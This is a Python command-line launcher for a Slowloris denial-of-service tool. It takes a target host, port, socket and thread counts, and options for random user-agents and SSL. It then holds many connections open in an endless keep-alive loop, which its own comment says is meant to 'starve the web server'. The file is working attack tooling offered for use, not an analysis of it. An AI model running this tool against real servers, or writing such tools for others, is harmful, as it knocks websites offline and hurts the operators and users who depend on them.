import argparse
import logging
import traceback
from . import logger
from .slowloris import SlowLoris


def main():
    try:
        # Parsing the arguments
        parser = argparse.ArgumentParser('slowloris', description='SlowLoris script written in Python by NaNkeen')
        parser.add_argument('host')
        parser.add_argument('--sock_count', default=200, type=int)
        parser.add_argument('--thread_count', default=5, type=int)
        parser.add_argument('-p', '--port', default=80, type=int)
        parser.add_argument('-v', '--verbose', dest='verbose', action='store_true', help='Verbose mode for more information')
        parser.add_argument('-ua', '--randon_agent', dest='random_agent', action='store_true', help='Randomizes user-agent')
        parser.add_argument('--ssl', dest='ssl', action='store_true', help='User SSL for requests')
        parser.set_defaults(verbose=False)
        parser.set_defaults(random_agent=False)
        parser.set_defaults(ssl=False)
        args = parser.parse_args()

        # Verbose logging for debugs
        if args.verbose is True:
            logger.setLevel(logging.DEBUG)

        # Initialize the SlowLoris object
        with SlowLoris((args.host, args.port), args.sock_count, args.thread_count, args.random_agent, args.ssl) as slowloris:
            slowloris.connect_sockets()

            # Keep all the sockets alive to starve the web server
            while True:
                slowloris.keep_alive()
    except KeyboardInterrupt:
        print('Interrupt received, shutting down...')
    except Exception as e:
        logger.error(e)
        logger.debug(traceback.format_exc())


if __name__ == '__main__':
    main()
